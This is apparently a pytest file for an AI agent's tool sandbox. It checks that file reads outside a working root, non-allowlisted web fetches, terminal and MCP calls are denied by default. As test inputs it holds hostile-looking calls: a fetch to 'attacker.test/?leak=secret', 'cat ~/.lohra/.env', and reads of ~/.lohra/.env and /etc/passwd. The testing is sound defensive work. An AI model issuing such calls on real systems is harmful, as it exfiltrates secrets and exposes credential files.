"""Tests for the leaf capability sandbox (Fase 8 §8.3)."""

import json
from pathlib import Path

from lohra.workflow.sandbox import (
    WorkflowPolicy,
    load_policy,
    make_sandboxed_leaf_factory,
    sandbox_dispatch,
)


def _base(name, args):
    return '{"ok": true, "ran": true}'  # the underlying dispatch "runs" the tool


def _denied(out: str) -> bool:
    return "error" in json.loads(out)


def test_fs_read_inside_working_root_allowed(tmp_path):
    target = tmp_path / "work" / "note.txt"
    target.parent.mkdir(parents=True)
    target.write_text("x")
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert not _denied(d("read_file", {"path": str(target)}))


def test_fs_read_outside_working_root_denied(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("read_file", {"path": str(tmp_path / "elsewhere.txt")}))


def test_fs_read_of_lohra_config_denied(tmp_path):
    # ~/.lohra/.env is outside the run's working_root -> deny-by-default.
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("read_file", {"path": str(Path.home() / ".lohra" / ".env")}))


def test_web_fetch_non_allowlisted_host_denied(tmp_path):
    policy = WorkflowPolicy(egress_allow=("good.test",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert _denied(d("web_fetch", {"url": "https://attacker.test/?leak=secret"}))
    assert not _denied(d("web_fetch", {"url": "https://good.test/page"}))


def test_egress_default_deny_when_no_allowlist(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("web_fetch", {"url": "https://anything.test/"}))


def test_tainted_run_denies_all_fs_and_egress(tmp_path):
    work = tmp_path / "work"
    work.mkdir()
    f = work / "ok.txt"
    f.write_text("x")
    policy = WorkflowPolicy(egress_allow=("good.test",))
    d = sandbox_dispatch(_base, working_root=work, policy=policy, tainted=True)
    assert _denied(d("read_file", {"path": str(f)}))  # even inside working_root
    assert _denied(d("web_fetch", {"url": "https://good.test/"}))  # even allowlisted
    assert _denied(d("web_search", {"query": "x"}))


def test_tool_outside_the_gated_classes_still_passes_through(tmp_path):
    # NAMED residual (issue #4): the sandbox gates fs, egress, `terminal` and
    # `mcp_*`. A name outside those four classes is NOT gated here — it is
    # already narrowed by `_CHILD_EXCLUDED_TOOLS` in subagent_dispatch, which
    # runs underneath. Gating unknown names by default would silently break any
    # ordinary stateless tool added to the registry later.
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=True)
    assert not _denied(d("some_other_tool", {"x": 1}))


# --- terminal: deny-by-default, operator opt-in only (issue #4 / F01-A) ---


def test_terminal_denied_by_default(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=False)
    out = d("terminal", {"command": "cat ~/.lohra/.env"})
    assert _denied(out)
    assert "allow_terminal" in out and "LOHRA_LEAF_ALLOW_TERMINAL" in out  # names the remedy


def test_terminal_allowed_when_the_operator_opts_in(tmp_path):
    policy = WorkflowPolicy(allow_terminal=True)
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert not _denied(d("terminal", {"command": "ls"}))


def test_tainted_run_denies_terminal_even_with_opt_in(tmp_path):
    policy = WorkflowPolicy(allow_terminal=True)
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=True)
    out = d("terminal", {"command": "ls"})
    assert _denied(out)
    assert "allow_terminal" not in out  # no remedy: taint has no override


# --- mcp_*: deny-by-default, per-server operator allowlist ---


def test_mcp_tool_denied_by_default(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=False)
    out = d("mcp_srv_query", {})
    assert _denied(out)
    assert "mcp_allow" in out and "LOHRA_LEAF_MCP_ALLOW" in out


def test_mcp_allowlist_is_per_server(tmp_path):
    policy = WorkflowPolicy(mcp_allow=("srv",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert not _denied(d("mcp_srv_query", {}))
    assert _denied(d("mcp_other_query", {}))  # another server stays denied
    assert _denied(d("mcp_srvx_query", {}))  # NOT a loose prefix match


def test_mcp_server_name_with_underscores_and_dashes(tmp_path):
    # `mcp_tool_name` slugs the server (lowercase, non-alnum -> "_"), so the
    # operator may write the server as configured; the policy slugs it the same.
    policy = WorkflowPolicy(mcp_allow=("My-Srv",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert not _denied(d("mcp_my_srv_query", {}))


def test_tainted_run_denies_an_allowlisted_mcp_tool(tmp_path):
    policy = WorkflowPolicy(mcp_allow=("srv",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=True)
    assert _denied(d("mcp_srv_query", {}))


# --- the operator surfaces: policy file + env ---


def test_load_policy_reads_terminal_and_mcp_keys(tmp_path):
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"allow_terminal": True, "mcp_allow": ["srv", "  ", 7, "Other"]}))
    policy = load_policy(p)
    assert policy.allow_terminal is True
    assert policy.mcp_allow == ("srv", "other")  # slugged; junk dropped


def test_load_policy_rejects_non_bool_allow_terminal(tmp_path):
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"allow_terminal": "false"}))  # truthy string -> dropped
    assert load_policy(p).allow_terminal is False


def test_env_can_opt_terminal_in_without_a_policy_file(tmp_path, monkeypatch):
    monkeypatch.setenv("LOHRA_LEAF_ALLOW_TERMINAL", "1")
    assert load_policy(tmp_path / "nope.json").allow_terminal is True


def test_env_garbage_is_ignored_and_stays_denied(tmp_path, monkeypatch):
    monkeypatch.setenv("LOHRA_LEAF_ALLOW_TERMINAL", "maybe")
    assert load_policy(tmp_path / "nope.json").allow_terminal is False


def test_env_mcp_allowlist_merges_with_the_file(tmp_path, monkeypatch):
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"mcp_allow": ["srv"]}))
    monkeypatch.setenv("LOHRA_LEAF_MCP_ALLOW", "other, third ,")
    assert load_policy(p).mcp_allow == ("srv", "other", "third")


def test_default_policy_is_deny_for_terminal_and_mcp():
    policy = WorkflowPolicy()
    assert policy.allow_terminal is False and policy.mcp_allow == ()


def test_load_policy_missing_file_is_default_deny(tmp_path):
    policy = load_policy(tmp_path / "nope.json")
    assert policy.fs_allow == () and policy.egress_allow == ()


def test_load_policy_reads_allowlists(tmp_path):
    # A bare string root is READ-WRITE (WF-21 back-compat: that is what every
    # policy written before the mode existed already granted). The ro/rw split
    # itself lives in tests/test_workflow_m7_fixes.py.
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"fs_allow": ["/data"], "egress_allow": ["api.test"]}))
    policy = load_policy(p)
    assert policy.egress_allow == ("api.test",)
    assert [(str(root.path), root.writable) for root in policy.fs_allow] == [("/data", True)]


def test_sandboxed_factory_wraps_dispatch():
    class FakeAgent:
        tool_dispatch = staticmethod(_base)

    factory = make_sandboxed_leaf_factory(
        base_factory=lambda: FakeAgent(),
        working_root=Path("/tmp/work"),
        policy=WorkflowPolicy(),
        tainted=False,
    )
    agent = factory()
    assert _denied(agent.tool_dispatch("read_file", {"path": "/etc/passwd"}))
